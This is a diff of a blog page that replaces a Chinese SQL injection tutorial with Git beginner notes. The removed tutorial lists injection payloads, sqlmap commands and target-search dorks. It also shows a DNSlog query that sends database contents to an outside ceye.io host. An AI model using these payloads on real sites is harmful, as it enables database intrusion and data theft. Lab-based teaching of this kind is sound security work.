@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="sql注入-详细步骤, 信安小白 web安全 CTF southerose">
+    <meta name="keywords" content="git, 信安小白 web安全 CTF southerose">
     <meta name="description" content="信安小白 | web安全 | CTF">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>sql注入-详细步骤 | southerose&#39;s Blog</title>
+    <title>git | southerose&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -247,12 +247,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/feature.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/20210411182120.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sql注入-详细步骤</h1>
+                    <h1 class="description center-align post-title">git</h1>
                 </div>
             </div>
         </div>
@@ -376,8 +376,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
-                                web安全
+                            <a href="/categories/%E5%B7%A5%E5%85%B7/" class="post-category">
+                                工具
                             </a>
                         
                     </div>
@@ -389,28 +389,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-04-05
+                    2021-04-11
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-04-09
+                    2021-04-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.5k
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    9 分
+                    6 分
                 </div>
                 
 
@@ -433,287 +433,128 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p> sql注入的详细步骤，包括寻找注入点，一些基本的流程，还有几种常见的sql注入分类的原理，已经修复建议等。</p>
-<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><h2 id="寻找-SQL-注入点"><a href="#寻找-SQL-注入点" class="headerlink" title="寻找 SQL 注入点"></a>寻找 SQL 注入点</h2><h3 id="目标搜集"><a href="#目标搜集" class="headerlink" title="目标搜集"></a>目标搜集</h3><h4 id="无特定目标"><a href="#无特定目标" class="headerlink" title="无特定目标"></a>无特定目标</h4><ul>
-<li>inurl:php?id=</li>
-</ul>
-<h4 id="有特定目标"><a href="#有特定目标" class="headerlink" title="有特定目标"></a>有特定目标</h4><ul>
-<li>inurl:php?id= site:target.com</li>
-</ul>
-<h4 id="工具爬取"><a href="#工具爬取" class="headerlink" title="工具爬取"></a>工具爬取</h4><ul>
-<li>spider，对搜索引擎和目标网站的连接进行爬取</li>
-</ul>
-<h3 id="注入识别"><a href="#注入识别" class="headerlink" title="注入识别"></a>注入识别</h3><h4 id="手工简单识别"><a href="#手工简单识别" class="headerlink" title="手工简单识别"></a>手工简单识别</h4><ul>
-<li><p>and 1=1 / and 1=2</p>
-</li>
-<li><p>and ‘1’=’1 / and ‘1’=’2</p>
-</li>
-<li><p>and 1 like 1 / and 1 like 2</p>
-</li>
-</ul>
-<h4 id="工具识别"><a href="#工具识别" class="headerlink" title="工具识别"></a>工具识别</h4><p>sqlmap -m filename (filename 中保存检测目标)</p>
-<p>sqlmap –crawl (sqlmap 对目标网站进行爬取，然后依次进行测试)</p>
-<h4 id="高级识别"><a href="#高级识别" class="headerlink" title="高级识别"></a>高级识别</h4><p>拓展广度和深度</p>
-<ul>
-<li><p>sqlmap –level 增加测试级别（1-5），对 head 中的相关参数也进行测试</p>
-</li>
-<li><p>sqlmap -r filename （file 中为网站请求数据）</p>
-</li>
-</ul>
-<p>利用工具提高识别效率</p>
-<ul>
-<li><p>burpsuite+sqlmap</p>
-</li>
-<li><p>burpsuite 拦截所有浏览器访问提交的数据</p>
-</li>
-<li><p>burpsuite 扩展插件，直接调用 sqlmap 进行测试（插件-SQLiPy Sqlmap Intergration || 也可以自己写插件）</p>
-</li>
-</ul>
-<p>一些 Tips:</p>
-<ul>
-<li><p>可以在参数后键入“*”来确定想要测试的参数</p>
-</li>
-<li><p>可能出现注入的点：新闻、登陆、留言</p>
-</li>
-<li><p>站在开发的角度去寻找</p>
-</li>
-</ul>
-<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><ul>
-<li><p>搜索关键代码和函数</p>
-</li>
-<li><p>梳理业务流程</p>
-</li>
-</ul>
-<p>例子：强网杯 WEB”python is the best language”</p>
-<h2 id="SQL-注入流程"><a href="#SQL-注入流程" class="headerlink" title="SQL 注入流程"></a>SQL 注入流程</h2><h3 id="流程导图"><a href="#流程导图" class="headerlink" title="流程导图"></a>流程导图</h3><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/Sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.png"></p>
-<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png"></p>
-<h4 id="数据获取"><a href="#数据获取" class="headerlink" title="数据获取"></a>数据获取</h4><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.png"></p>
-<h5 id="手工查询"><a href="#手工查询" class="headerlink" title="手工查询"></a>手工查询</h5><ul>
-<li><p>查库</p>
-<pre class="line-numbers language-none"><code class="language-none">select schema_name from information_schema.schemata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><p>查表</p>
-<pre class="line-numbers language-none"><code class="language-none">select table_name from information_schema.tables where table_schema=库名 \ 0x库名 \ database()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><p>查列</p>
-<pre class="line-numbers language-none"><code class="language-none">select column_name from information_scheme.columns where table_name=表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><p>查数据</p>
-<pre class="line-numbers language-none"><code class="language-none">select 列名 from 库名.表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ul>
-<h5 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h5><ol>
-<li>所有的 Sql 注入，都是基于查库、表、列语句</li>
-<li>如果数据太多导致无法查询结果<br>查询的场景：可利用 limit 限定返回的数量及位置，依次查询<br>回显数据的场景：concat() ,group_concat(),concat_ws()+limit</li>
-<li>在一些场景，想要快速获取数据，需借助工具，如：BurpSuite</li>
-</ol>
-<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/%E6%8F%90%E6%9D%83.png"></p>
-<h3 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h3><h4 id="UNION-联合查询注入"><a href="#UNION-联合查询注入" class="headerlink" title="UNION 联合查询注入"></a>UNION 联合查询注入</h4><blockquote>
-<p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集</p>
+                <h1 id="Git学习"><a href="#Git学习" class="headerlink" title="Git学习"></a>Git学习</h1><p>个人学习笔记记录有限，若完整学习，请移步码云官方==Git大全==！</p>
+<h2 id="Git完整内容学习"><a href="#Git完整内容学习" class="headerlink" title="Git完整内容学习"></a>Git完整内容学习</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/all-about-git">码云Git大全</a></p>
 </blockquote>
-<p><strong>注意：</strong></p>
-<ul>
-<li><p>UNION 内部的 SELECT 语句必须拥有相同数量的列。</p>
-</li>
-<li><p>列也必须拥有相似的数据类型。</p>
-</li>
-<li><p>同时每条 SELECT 语句中的列的顺序必须相同。</p>
-</li>
-<li><p>默认情况下，UNION 操作符选取不同的值。如果允许重复的值，则使用 UNION ALL。</p>
-</li>
-</ul>
-<h5 id="UNION-注入应用场景"><a href="#UNION-注入应用场景" class="headerlink" title="UNION 注入应用场景"></a>UNION 注入应用场景</h5><ul>
-<li>只有最后一个 SELECT 子句允许有 ORDER BY；</li>
-<li>只有最后一个 SELECT 子句允许有 LIMIT；</li>
-<li>只要 UNION 连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果；</li>
-<li>注入点页面有回显；</li>
-</ul>
-<h5 id="UNION-注入过程"><a href="#UNION-注入过程" class="headerlink" title="UNION 注入过程"></a>UNION 注入过程</h5><blockquote>
-<p>ORDER BY 猜出来的列数超过数据库表中的列数，报错并不能返回出数据</p>
+<h2 id="Git-学习笔记"><a href="#Git-学习笔记" class="headerlink" title="Git 学习笔记"></a>Git 学习笔记</h2><h3 id="常见的版本控制工具"><a href="#常见的版本控制工具" class="headerlink" title="常见的版本控制工具"></a>常见的版本控制工具</h3><p>Git</p>
+<p>SVN</p>
+<p>CVS</p>
+<p>VSS</p>
+<p>TFS</p>
+<h3 id="版本控制分类"><a href="#版本控制分类" class="headerlink" title="版本控制分类"></a>版本控制分类</h3><p><strong>1.本地版本控制</strong> </p>
+<p><strong>2.集中式版本控制 SVN</strong></p>
+<p>所有的版本数据都在服务器上 ，必须联网</p>
+<p><strong>3.分布式版本控制系统 Git</strong></p>
+<p>每个人都拥有全部的代码，在本地就能看到版本数据</p>
+<p>不会因为服务器损坏，造成不能工作的情况</p>
+<h3 id="Git和SVN的主要区别"><a href="#Git和SVN的主要区别" class="headerlink" title="Git和SVN的主要区别"></a>Git和SVN的主要区别</h3><p><strong>SVN集中版本控制系统</strong></p>
+<p>SVN是集中式版本控制系统，版本库是集中放在中央服务器的，而工作的时候，用的都是自己的电脑，所以首先要从中央服务器得到最新的版本，然后工作，完成工作后，需要把自己做完的活推送到中央服务器。集中式版本控制系统是必须联网才能工作，对网络带宽要求较高。</p>
+<p><strong>Git分布式版本控制系统</strong></p>
+<p>Git是分布式版本控制系统，没有中央服务器，每个人的电脑就是一个完整的版本库，工作的时候不需要联网了，因为版本都在自己电脑上。协同的方法是这样的∶比如说自己在电脑上改了文件A，樊他人也在电脑上改了文件A，这时，你们两之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。Git可以直接看到更新了哪些代码和文件!</p>
+<p><strong>Git是目前世界上最先进的分布式版本控制系统。</strong></p>
+<p>官网下载慢，采用镜像下载</p>
+<p><strong><a target="_blank" rel="noopener" href="https://npm.taobao.org/mirrors/git-for-windows/">https://npm.taobao.org/mirrors/git-for-windows/</a></strong></p>
+<h3 id="bash基础命令"><a href="#bash基础命令" class="headerlink" title="bash基础命令"></a>bash基础命令</h3><p><strong>mkdir 创建目录/文件夹</strong></p>
+<p><strong>rm -r 删除文件夹</strong></p>
+<p><strong>touch 创建文件</strong></p>
+<p><strong>rm 删除文件</strong></p>
+<p><strong>pwd 显示当前所在目录路径</strong></p>
+<p><strong>history 查看历史命令</strong></p>
+<p>help 查看帮助</p>
+<p>exit 退出</p>
+<p>‘’#’’ 注释</p>
+<h3 id="git命令"><a href="#git命令" class="headerlink" title="git命令"></a>git命令</h3><blockquote>
+<p><strong>所有的配置文件其实都保存在本地</strong></p>
+<p><strong>[1] Git\etc\gitconfig   Git安装目录下的gitconfig   –system系统级</strong></p>
+<p><strong>[2] C:\Users\Administrator.gitconfig   只适用于当前登录的用户配置   –globle 全局</strong></p>
 </blockquote>
-<ol>
-<li>ORDER BY 确定列数</li>
-<li>观察页面返回，选取可以显示数据的位置，进行下一步的注入</li>
-<li>读库信息</li>
-<li>读表信息</li>
-<li>读字段</li>
-<li>读数据</li>
-</ol>
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><blockquote>
-<p>构造 payload 让信息通过错误提示回显出来</p>
-</blockquote>
-<h5 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h5><p>查询不回现内容，会打印错误信息</p>
-<p>Update、insert 等语句，会打印错误信息</p>
-<h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h5><p>凡是能够让错误信息显示的函数（语句），都能实现报错注入，以下列举 3 种。</p>
-<ul>
-<li>foor()</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2))
-//concat:连接字符串功能
-//floor:取flout的整数值
-//rand:取0~1之间的随机浮点值
-//group by:根据一个或多个列对结果集进行分组并有排序功能<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">git config -l #查看配置列表
+git config --system --list #查看系统配置列表
+git config --global --list #查看全局配置!必须配置
+git config --global user.name "southerose" #全局配置用户名
+git config --global user.email "1374900749@qq.com" #全局配置邮箱<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<ul>
-<li>extractvalue()</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">select extractvalue(1,concat(0x7e,(select user()),0x7e))
-//去掉select也可以
-extractvalue(1,concat(0x7e,(user()),0x7e))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="git环境配置"><a href="#git环境配置" class="headerlink" title="git环境配置"></a>git环境配置</h3><pre class="line-numbers language-py" data-language="py"><code class="language-py">git config --global user.name "southerose" #全局配置用户名
+git config --global user.email "1374900749@qq.com" #全局配置邮箱<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<ul>
-<li>updatexml()</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">select updatexml(1,concat(0x7e,(select user()),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="git基本理论（核心）"><a href="#git基本理论（核心）" class="headerlink" title="git基本理论（核心）"></a>git基本理论（核心）</h3><p><img src="C:\Users\Polaris\AppData\Roaming\Typora\typora-user-images\image-20201020211550366.png" alt="image-20201020211550366"></p>
+<p>Workspace：<strong>工作区</strong>，平时存放代码的地方。</p>
+<p>Index/Stage：<strong>暂存区</strong>，用于临时存放你的改动，事实上他只是一个文件，保存即将提交到文件列表的信息。</p>
+<p>Repository：<strong>仓库区</strong>（或本地仓库），就是安全存放数据的位置，这里面有你提交到所有版本的数据，其中HEAD指向最新放入仓库的版本。</p>
+<p>Remote：<strong>远程仓库</strong>，托管代码的服务器，可以简单的认为是你项目组中的一台电脑用于远程数据交换。</p>
+<p><img src="C:\Users\Polaris\AppData\Roaming\Typora\typora-user-images\image-20201020213452490.png" alt="image-20201020213452490"></p>
+<h3 id="git项目的搭建"><a href="#git项目的搭建" class="headerlink" title="git项目的搭建"></a>git项目的搭建</h3><p><strong>本地仓库搭建</strong></p>
+<p>方式：1.创建全新的仓库</p>
+<p>​            2.克隆远程仓库</p>
+<p>[1] 创建全新的仓库，需要用到GIT管理的项目的根目录执行：</p>
+<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># 在当前目录创建一个Git代码库
+$ git init
+# 从远程克隆到本地仓库
+$ git clone [url]
+# 添加所有文件到暂存区stages
+$ git add .
+# 提交暂存区的内容到本地仓库repository -m提交信息
+$git commit -m "content"//m:message
+# 推动到remote
+$git push
+#查看制定文件状态
+$ git status [filename]
+# 查看所有文件状态
+$ git status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><blockquote>
-<p>构造语句来判断数据库信息的正确性，再通过页面的‘真’和‘假’（状态）来识别我们的判断是否正确。</p>
-<p>举个猜单词的例子：“good”，第一位我猜是‘’a‘’，页面返回假，但是我猜‘g’，页面就返回真。然后依次猜后面的字母。</p>
+<p>[2] 执行后可以看到，仅仅在项目目录多出了一个.git目录，关于版本等的所有信息都在这个目录里面。</p>
+<h3 id="git文件操作"><a href="#git文件操作" class="headerlink" title="git文件操作"></a>git文件操作</h3><blockquote>
+<p>文件的四种状态</p>
 </blockquote>
-<h6 id="布尔盲注的方法"><a href="#布尔盲注的方法" class="headerlink" title="布尔盲注的方法"></a>布尔盲注的方法</h6><blockquote>
-<p>构造逻辑判断语句，判断信息的真假，取出所有的真值，实现 SQL 注入</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th align="center">序号</th>
-<th align="center">方法</th>
-<th align="center">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">1</td>
-<td align="center">left()函数</td>
-<td align="center">left(database(),1)&gt;’s’ //判断 database()的前一位是否大于’s’<br>database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</td>
-</tr>
-<tr>
-<td align="center">2</td>
-<td align="center">regexp</td>
-<td align="center">select user() regexp ‘^r’ //判断 user()的头位置是否为’r’<br>正则表达式的用法，user()结果为 root,regexp 为匹配 root 的正则表达式</td>
-</tr>
-<tr>
-<td align="center">3</td>
-<td align="center">like</td>
-<td align="center">select user() like ‘ro%’<br>与 regexp 类似，使用 like 进行匹配</td>
-</tr>
-<tr>
-<td align="center">4</td>
-<td align="center">substr()函数<br>ascii()函数</td>
-<td align="center">ascii(substr((select database()),1,1))≠98<br>substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度，ascii()将字符转换为 ascii 值</td>
-</tr>
-<tr>
-<td align="center">5</td>
-<td align="center">ord()函数<br>mid()函数</td>
-<td align="center">ord(mid((select user()),1,1))=114<br>mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 ord()函数通 ascii，将字符转为 ascii 值</td>
-</tr>
-</tbody></table>
-<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><blockquote>
-<p>代码存在 SQL 注入漏洞，然而页面不会回显数据，也不会回显错误信息；</p>
-<p>语句执行后也不知道真假，我们不能通过页面返回的内容来进行判断；</p>
-<p>可以构造语句，通过页面响应的市场，来判断信息，这就是时间盲注</p>
-</blockquote>
-<h6 id="时间盲注的方法"><a href="#时间盲注的方法" class="headerlink" title="时间盲注的方法"></a>时间盲注的方法</h6><blockquote>
-<p>构造逻辑语句，通过条件语句进行判断，为真立刻执行，否则延时执行</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th align="center">核心语法</th>
-<th align="center">真实场景</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">if(left(user(),1)=’a’,0,sleep(3))</td>
-<td align="center">if(ascii(substr(user(),1,1))&gt;115,0,sleep(2))%23</td>
-</tr>
-</tbody></table>
-<h5 id="Dnslog-盲注"><a href="#Dnslog-盲注" class="headerlink" title="Dnslog 盲注"></a>Dnslog 盲注</h5><blockquote>
-<p>代码存在 SQL 注入漏洞，然而页面既不会回显数据，也不会显示错误显示；</p>
-<p>我们通过布尔或者时间盲注可以获取到内容，但是整个过程效率较低，需要发送很多的请求进行判断，很肯能会出发安全设备的防护；</p>
-<p>我们需要一种方式，减少请求 ，直接回显数据，这里可以使用 Dnslog 实现注入。</p>
-<p>Dnslog 平台：<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a></p>
-</blockquote>
-<h6 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h6><p>DNS 在解析的时候回留下日志 ，通过读取多级域名的解析日志，获取请求信息。</p>
-<p>MySql LOAD_FILE 函数可以发起请求：</p>
-<p>SELECT LOAD_FILE(CONCAT(‘\\‘,’test’,’.mysql.6pd3g5.ceye.io\abc’));</p>
-<h6 id="Dnslog-盲注方法"><a href="#Dnslog-盲注方法" class="headerlink" title="Dnslog 盲注方法"></a>Dnslog 盲注方法</h6><p>构造语句，利用 load_file()函数发起请求，使用 Dnslog 接收请求，获取数据</p>
-<p>Tips：目标服务器必须是 Windows，应为 LOAD_FILE 函数不能运行在 Linux 下。</p>
-<p>通过 SQL 语句查询内容，作为请求的一部分，发送至 Dnslog;</p>
-<p>只要对这一部分的语句进行构造，就能实现有回显的 SQL 注入;</p>
-<p>值得注意的是，这些数据格式和内容队友限制（:,~,@），需要进行一些处理。</p>
-<pre class="line-numbers language-none"><code class="language-none">#sqlilabs环境下：
-http://127.0.0.1/sqlilabs/Less-1/?id=1' and if((SELECT LOAD_FILE(CONCAT('\\\\',(select database()),'.6pd3g5.ceye.io\\abc'))),1,1)--+
-#navicat环境下：
-SELECT LOAD_FILE(CONCAT('\\\\',(select database()),'.6pd3g5.ceye.io\\abc'));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Untracked：<strong>未跟踪</strong>，此文件在文件夹中，,但并没有加入到git库,不参与版本控制.通过==git add==状态变为==staged==</p>
+<p>Unmodify：<strong>文件已经入库</strong>,未修改，即版本库中的文件快照内容与文件夹中完全一致.这种类型的文件有两种去处,如果它被修改,而变为==Modified== .如果使用==git rm==移出版本库,则成为==Untracked==文件</p>
+<p>Modified:<strong>文件已修改</strong>，仅仅是修改，并没有进行其他的操作.这个文件也有两个去处,，通过==git add==可进入暂存==staged==状态，使用==git checkout==则丢弃修改过，返回到==unmodify==状态，这个 ==git checkout==即从库中取出文件，覆盖当前修改!</p>
+<p>Staged:<strong>暂存状态</strong>,执行==git commit==则将修改同步到库中,这时库中的文件和本地文件又变为一致，文件为==Unmodify==状态.执行==git reset HEAD filename==取消暂存,文件状态为==Modified==</p>
+<h3 id="git忽略文件"><a href="#git忽略文件" class="headerlink" title="git忽略文件"></a>git忽略文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 注释</span>
+<span class="token operator">*</span><span class="token punctuation">.</span>txt 忽略所有以<span class="token punctuation">.</span>txt结尾的文件
+！lib<span class="token punctuation">.</span>txt <span class="token comment">#lib.txt除外</span>
+<span class="token operator">/</span>temp <span class="token comment">#仅忽略项目根目录下的TODO目录，不包括其他目录temp</span>
+build<span class="token operator">/</span> <span class="token comment">#忽略build/目录下的所有文件</span>
+doc<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>txt <span class="token comment">#忽略doc/notes.txt 但不包括 doc/server/arch.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>字符大小为一个字节就为窄字节</p>
-<p>字符大小为两个字节就位宽字节</p>
-<p>宽字节：GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际为两字节。</p>
-<h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><p>使用 UTF-8，避免宽字节注入；</p>
-<ol>
-<li>ps：不仅在 gbk、韩文、日文等等都是宽字节，都有可能存在宽字节注入漏洞</li>
-<li>mysql_real_escape_string,mysql_set_charset(‘gbk’,$conn)；</li>
-<li>可以设置参数，character_set_client=binary,<br>例如$result=mysql_query(“character_set_client=binary”,$sql)；</li>
-</ol>
-<h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><pre class="line-numbers language-none"><code class="language-none">输入 	   处理     	编码   	   带入SQL
- '   	 \'      %5c%27 \'   id=1\' and    &gt;&gt;不能注入
+<h3 id="使用码云"><a href="#使用码云" class="headerlink" title="使用码云"></a>使用码云</h3><p>1.注册账号，并且完善个人信息（不能乱填）</p>
+<p>2.设置本机ssh公钥，实现免密码登陆</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 进入 c:\Users\Administrator\.ssh</span>
+<span class="token comment"># 生成公钥</span>
+$ ssh<span class="token operator">-</span>keygen
+<span class="token comment"># 生成公钥并且使用rsa加密</span>
+$ ssh<span class="token operator">-</span>keygen <span class="token operator">-</span>t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
- //MySQL在使用GBK编码的时候，会认为两个字符为一个函数
- %df    %df\'   %df%5c%27 啊'   id=啊' and  &gt;&gt;可以注入
- 两个字符组合，认为是一个汉字
- 注：前一个ASCII码大于128才能到汉字的范围<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h5 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h5><p>在注入点后键入%df，然后按照正常的流程开始注入</p>
-<p>sqlilabs-less-32（测试环境）</p>
-<h5 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h5><h6 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h6><pre class="line-numbers language-none"><code class="language-none">//黑盒测试
-在可能的注入点后键入%df，之后进行注入测试
-//白盒测试
-1.查看MySQL编码是否为GBK
-2.是否使用preg_replace把单引号替换成\'
-3.是否使用addslashes进行转义
-4.是否使用mysql_real_escape_string进行转义<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h6 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h6><pre class="line-numbers language-none"><code class="language-none">//在参数id=1后加%df
-python sqlmap.py -u http://localhost/sqlilabs/Less-32/?id=1%df<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h4 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h4><p>为什么要编码？</p>
-<p>e.g.</p>
-<p>?id=1&amp;username=admin&amp;passwd=admin</p>
-<p>假如用户的 username 中存在&amp;、？就会和 URL 冲突</p>
-<blockquote>
-<p>宽字节注入和二次注入都是在面对 PHP 代码或配置，对输入的’(单引号)进行转义的时候，在处理用户输入数据是存在问题，可绕过转义。</p>
+<p>3.将公钥信息public key 添加到码云账户即可</p>
+<p>4.使用码云创建一个自己的仓库</p>
+<h3 id="将本地项目部署到远程仓库"><a href="#将本地项目部署到远程仓库" class="headerlink" title="将本地项目部署到远程仓库"></a>将本地项目部署到远程仓库</h3><blockquote>
+<p>1.创建一个远程仓库</p>
+<p>2.创建一个项目</p>
+<p>3.将远程仓库clone到本地</p>
+<p>4.将远程仓库的文件内容复制到本地项目文件里面</p>
+<p>5.在项目里面依次</p>
+<p>git add .</p>
+<p>git commit -m “demo”</p>
+<p>git push</p>
 </blockquote>
-<h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><p>urlencode()与 PHP 本身编码时，两者配合失误，构造数据消灭\</p>
-<pre class="line-numbers language-none"><code class="language-none">用户输入	PHP自身编码	   转义 		  带入SQL
-id=1%27      id=1'      id=1\'     id=1\' and  			&lt;&lt;不能注入
-
-用户输入     PHP自身编码   转义     函数编码   带入SQL
-id=1%2527   id=1%27    id=1%27    id=1'    id=1' and    &lt;&lt;可以注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h5 id="注入-1"><a href="#注入-1" class="headerlink" title="注入"></a>注入</h5><h6 id="手工-1"><a href="#手工-1" class="headerlink" title="手工"></a>手工</h6><pre class="line-numbers language-none"><code class="language-none">//黑盒测试
-在可能的注入点后键入%2527，之后进行注入测试
-?id=1%2527
-//白盒测试
-1.是否使用户urldecode
-2.urldecode函数是否在转义的方法之后<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h6 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h6><p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://localhost/sqlilabs/Less-32/?id=1%2527">http://localhost/sqlilabs/Less-32/?id=1%2527</a></p>
-<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><h5 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h5><ol>
-<li><p>插入恶意数据</p>
-<blockquote>
-<p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还保留了原来的数据，但是数据本身包含恶意内容。</p>
-</blockquote>
-</li>
-<li><p>引用恶意数据</p>
-<blockquote>
-<p>在将数据存入到数据库之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成 SQL 的二次注入。</p>
-</blockquote>
-</li>
-</ol>
-<p>示意图</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%9B%BE.png"></p>
-<p>练习</p>
-<p>sqlilabs-less-24</p>
-<h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><blockquote>
-<p>对外部提交的数据，需要更加谨慎的对待。</p>
